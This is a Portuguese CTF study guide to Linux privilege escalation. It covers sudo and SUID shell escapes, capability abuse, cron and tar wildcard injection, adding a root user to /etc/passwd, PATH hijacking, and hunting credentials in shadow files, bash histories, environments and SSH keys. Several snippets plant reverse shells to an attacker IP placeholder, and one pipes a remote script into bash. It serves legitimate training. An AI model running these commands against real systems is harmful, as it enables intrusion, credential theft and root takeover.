# Guia de Escalação de Privilégios (Linux) para CTF
### Boot2Root 

> Para entender o **porquê** de cada mecanismo (SUID, capabilities, sudo, etc.) e como ele aparece no design de desafios CTF, veja a [teoria de privesc Linux](../categories/teoria_privesc_linux.md).

Contexto: você já tem uma shell como usuário comum (via web, RCE, SSH). Agora o objetivo é virar `root`.

Metodologia base:
```
Enumerar (o que EU posso fazer) → Identificar vetor → Confirmar → Explorar → root
```

**Regra de ouro:** rode todo o checklist de enumeração ANTES de tentar qualquer exploit — o caminho certo costuma estar em mais de um lugar ao mesmo tempo (ex: um binário SUID *e* uma entrada de cron *e* um arquivo gravável), e só vendo tudo junto você identifica a cadeia certa.

---

## Índice
1. [Checklist de enumeração inicial](#1-checklist-de-enumeração-inicial)
2. [sudo -l e GTFOBins](#2-sudo--l-e-gtfobins)
3. [Binários SUID/SGID](#3-binários-suidsgid)
4. [Linux Capabilities](#4-linux-capabilities)
5. [Cron jobs](#5-cron-jobs)
6. [Arquivos e diretórios graváveis](#6-arquivos-e-diretórios-graváveis)
7. [Variáveis de ambiente e PATH hijacking](#7-variáveis-de-ambiente-e-path-hijacking)
8. [Kernel exploits](#8-kernel-exploits)
9. [Credenciais espalhadas pelo sistema](#9-credenciais-espalhadas-pelo-sistema)
10. [Serviços internos e pivoting](#10-serviços-internos-e-pivoting)
11. [Scripts de automação (linpeas)](#11-scripts-de-automação-linpeas)
12. [Fluxo de decisão rápido](#12-fluxo-de-decisão-rápido)

---

## 1. Checklist de enumeração inicial

Rodar sempre, nessa ordem, assim que ganhar shell:

```bash
# Quem sou eu / onde estou
whoami; id; groups
hostname; pwd

# Sistema operacional (importante para kernel exploits)
uname -a
cat /etc/os-release

# O que posso rodar como root
sudo -l

# Binários com privilégio herdado
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
getcap -r / 2>/dev/null                      # capabilities

# Processos e rede
ps aux
ss -tulnp
ip addr; ip route

# Tarefas agendadas
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l

# Arquivos graváveis por mim
find / -writable -type f 2>/dev/null | grep -v "^/proc"
find / -writable -type d 2>/dev/null | grep -v "^/proc"

# Histórico de comandos (pode ter senha digitada por engano)
cat ~/.bash_history
find / -name "*.bash_history" 2>/dev/null
```

Guarde essa saída — você vai voltar a consultar ela várias vezes conforme testa cada vetor.

---

## 2. sudo -l e GTFOBins

### Identificar
```bash
sudo -l
```
Saída típica:
```
User ada may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```

### Como explorar
Pegue o binário listado e procure em **[gtfobins.github.io](https://gtfobins.github.io/)** pela seção "Sudo". Exemplos comuns:

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim / vi
sudo vim -c ':!/bin/sh'

# less / more
sudo less /etc/passwd
!/bin/sh

# python
sudo python3 -c 'import os; os.system("/bin/sh")'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# nmap (versões antigas com --interactive)
sudo nmap --interactive
!sh

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# cp / cat como forma de ler arquivos protegidos (sem shell, mas útil)
sudo cat /root/root.txt
sudo cp /etc/shadow /tmp/shadow_copy
```

### Se o sudo permitir rodar como outro usuário específico (não root direto)
```
(otheruser) NOPASSWD: /caminho/do/script
```
Ainda vale a pena — pode ser um passo intermediário pra chegar em root depois (privesc em cadeia).

### Testar sudo sem -l (quando -l está bloqueado)
```bash
sudo -u#-1 whoami    # bug em versões antigas do sudo (CVE-2019-14287) — pode retornar root
```

---

## 3. Binários SUID/SGID

### Identificar
```bash
find / -perm -4000 -type f 2>/dev/null
```
Filtre o que é **padrão do sistema** (não vale a pena, ex: `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/su`) do que é **incomum** — binário customizado, fora do `/usr/bin`, nome estranho, ou uma cópia de binário padrão com bit SUID que normalmente não tem.

### Como explorar
Mesma lógica do sudo: consultar **GTFOBins**, seção "SUID". Exemplos:

```bash
# find (com SUID, sem precisar de sudo)
./find . -exec /bin/sh -p \; -quit

# nmap
./nmap --interactive
!sh

# php
./php -r "pcntl_exec('/bin/sh', ['-p']);"

# python
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
> Note o `-p` em alguns comandos — preserva privilégios (importante quando o shell dropa privilégio por padrão).

### Binário customizado (mais comum em CTF)
Se achar um binário SUID que não é do sistema padrão (ex: `/usr/local/bin/backup`), analise:
```bash
file /usr/local/bin/backup
strings /usr/local/bin/backup | less
```
Procure por:
- Chamadas a outros binários sem path absoluto (`system("ls")` em vez de `system("/bin/ls")`) → **PATH hijacking** (seção 7)
- Leitura/escrita de arquivo com path previsível → race condition ou manipulação de arquivo
- Buffer overflow clássico (se você tem experiência com pwn, esse é seu terreno natural)

---

## 4. Linux Capabilities

### Identificar
```bash
getcap -r / 2>/dev/null
```
Saída típica:
```
/usr/bin/python3.9 cap_setuid+ep
```

### Como explorar
Consultar **GTFOBins**, seção "Capabilities". Exemplos:

```bash
# cap_setuid (permite virar qualquer UID, inclusive 0/root)
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_setuid no perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# cap_dac_read_search (lê qualquer arquivo, ignora permissão)
/usr/bin/tar (com essa capability) pode ler /etc/shadow diretamente
```

Capabilities perigosas a procurar: `cap_setuid`, `cap_setgid`, `cap_dac_read_search`, `cap_dac_override`, `cap_sys_admin`.

---

## 5. Cron jobs

### Identificar
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l                    # do usuário atual
crontab -l -u outrouser 2>/dev/null   # pode falhar sem permissão
```

### O que procurar
- Scripts rodados por root em intervalos regulares
- **O script é gravável por você?** → editar e injetar reverse shell
- **O script chama um comando sem path absoluto?** → PATH hijacking (seção 7)
- **Wildcard em comando tar/rsync dentro de cron** → wildcard injection (técnica avançada)

### Explorar (script gravável)
```bash
# Verificar permissão
ls -la /caminho/do/script.sh

# Se gravável, adicionar payload
echo 'bash -c "bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1"' >> /caminho/do/script.sh

# Esperar o cron rodar (verificar frequência no crontab) e ter o listener pronto:
nc -lvnp 4444
```

### Wildcard injection (tar via cron, técnica clássica GTFOBins)
Se um cron roda algo como `tar -czf backup.tar.gz *` num diretório onde você pode criar arquivos:
```bash
cd /diretorio/do/backup
echo 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# quando o cron rodar tar * ele vai interpretar esses "arquivos" como flags
```

---

## 6. Arquivos e diretórios graváveis

### Identificar
```bash
find / -writable -type f 2>/dev/null 2>&1 | grep -v "^/proc"
find / -writable -type d 2>/dev/null 2>&1 | grep -v "^/proc"
```
Foque em diretórios que não deveriam ser graváveis por um usuário comum: `/etc`, `/opt`, dentro de `/usr`, scripts de serviço.

### O que fazer com cada tipo

**`/etc/passwd` gravável (raro, mas acontece em CTF didático):**
```bash
openssl passwd -1 -salt xyz senha123
# gera hash, adicionar linha:
echo 'hacker:HASH_GERADO:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

**Script de serviço systemd gravável:**
```bash
# se /etc/systemd/system/algum-servico.service for gravável e reiniciado por root
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'
```

**Diretório dentro do PATH gravável** → ver seção 7 (PATH hijacking)

---

## 7. Variáveis de ambiente e PATH hijacking

### Identificar
```bash
echo $PATH
env | grep -i path
```

### O ataque
Se um binário SUID/script rodado por root chama um comando **sem path absoluto** (ex: `system("ls")` em vez de `system("/bin/ls")`), e você consegue escrever em algum diretório que está **antes** no `$PATH`, pode criar um binário malicioso com esse nome:

```bash
# Se o script/binário chama "ls" sem path absoluto
echo '#!/bin/bash' > /tmp/ls
echo 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# executar o binário/script vulnerável de novo
```

Identificar essa vulnerabilidade normalmente exige olhar o binário com `strings`:
```bash
strings /caminho/do/binario | grep -E "^[a-z]+$"    # comandos chamados sem path
```

---

## 8. Kernel exploits

### Identificar versão
```bash
uname -a
cat /etc/os-release
```

### Quando usar
Só depois de esgotar os vetores acima (sudo, SUID, capabilities, cron) — kernel exploits em CTF costumam ser "último recurso" porque podem travar a máquina, e Boot2Root geralmente tem um caminho mais limpo.

### Como buscar
```bash
# No alvo, versão do kernel:
uname -r

# Na sua máquina, buscar CVE conhecida pra essa versão:
searchsploit linux kernel <versão>
```
Ferramentas de checagem automatizada: **linux-exploit-suggester** (rodar no alvo, lista exploits compatíveis com a versão de kernel detectada).

---

## 9. Credenciais espalhadas pelo sistema

### Onde procurar (retomando o que a cartilha 2 já ensinava, agora com foco em privesc)
```bash
# Arquivos de configuração
find / -name "*.conf" 2>/dev/null | xargs grep -li "password" 2>/dev/null
grep -Ri "password" /var/www /opt /etc 2>/dev/null

# Variáveis de ambiente
env | grep -i pass
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# Histórico de bash
cat ~/.bash_history
find / -name ".bash_history" 2>/dev/null -exec cat {} \;

# Chaves SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Arquivos de aplicação comuns
find / -name ".env" 2>/dev/null
find / -name "config.php" -o -name "settings.py" -o -name "wp-config.php" 2>/dev/null

# Banco de dados SQLite local
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null
```

### Reutilização de credencial
Qualquer senha encontrada — teste em:
```bash
su <usuario_encontrado>     # trocar de usuário local
ssh <usuario>@localhost     # às vezes libera capacidades diferentes via SSH
sudo -l                     # rodar de novo como o novo usuário, pode ter permissões diferentes
```

---

## 10. Serviços internos e pivoting

### Identificar
```bash
ss -tulnp
```
Portas só em `127.0.0.1` (ex: `127.0.0.1:9000`) indicam serviço interno não acessível de fora.

### Explorar
```bash
# Testar conexão direta
nc -nv 127.0.0.1 9000
curl http://127.0.0.1:9000

# Se for um serviço web interno, redirecionar via SSH local port forward
# (rodando da SUA máquina, com credencial SSH já obtida)
ssh -L 9000:127.0.0.1:9000 usuario@<TARGET_IP>
# depois, no seu navegador: http://127.0.0.1:9000
```

Serviços internos comuns em CTF: painel admin sem autenticação, Redis sem senha (`redis-cli -h 127.0.0.1`), banco de dados exposto só localmente.

---

## 11. Scripts de automação (linpeas)

Quando o checklist manual está travado ou você quer confirmar que não deixou nada passar, rodar o **linpeas.sh** (LinPEAS) acelera bastante:

```bash
# Na sua máquina, servir o script
python3 -m http.server 8000

# No alvo, baixar e rodar
curl http://<SEU_LOCAL_IP>:8000/linpeas.sh | bash
# ou
wget http://<SEU_LOCAL_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

> Cuidado: a saída é longa. Procure por trechos destacados em **vermelho/amarelo** — o script já sinaliza o que é mais provável de ser explorável. Use como confirmação/aceleração, não como substituto de entender o checklist manual (a regra "IA proibida durante a prova" não se aplica a scripts de enumeração como esse, mas vale confirmar com a organização se scripts de terceiros têm alguma restrição).

---

## 12. Fluxo de decisão rápido

```
┌──────────────────────┐
│  sudo -l              │──→ tem algo? → GTFOBins → shell root
└──────────┬────────────┘
           │ nada
           ↓
┌──────────────────────┐
│  find SUID/SGID        │──→ binário incomum? → GTFOBins/análise → root
└──────────┬────────────┘
           │ nada de novo
           ↓
┌──────────────────────┐
│  getcap capabilities   │──→ cap_setuid/dac_override? → explorar → root
└──────────┬────────────┘
           │ nada
           ↓
┌──────────────────────┐
│  cron jobs             │──→ script gravável/wildcard? → injetar → aguardar
└──────────┬────────────┘
           │ nada
           ↓
┌──────────────────────┐
│  arquivos graváveis    │──→ /etc/passwd, systemd service? → explorar
└──────────┬────────────┘
           │ nada
           ↓
┌──────────────────────┐
│  credenciais no        │──→ .env, config, bash_history, SSH keys?
│  sistema                │    → su/ssh com credencial encontrada
└──────────┬────────────┘
           │ nada
           ↓
┌──────────────────────┐
│  serviços internos      │──→ porta só local? → pivoting/port forward
└──────────┬────────────┘
           │ nada
           ↓
┌──────────────────────┐
│  linpeas.sh             │──→ confirmação automatizada + kernel exploit
└────────────────────────┘
```

**Tempo de prova é curto (3h)** — não gaste mais de 5-10 minutos em cada vetor sem sinal claro antes de passar pro próximo item do checklist. Volte depois se algo parecer promissor mas não fechou de primeira.
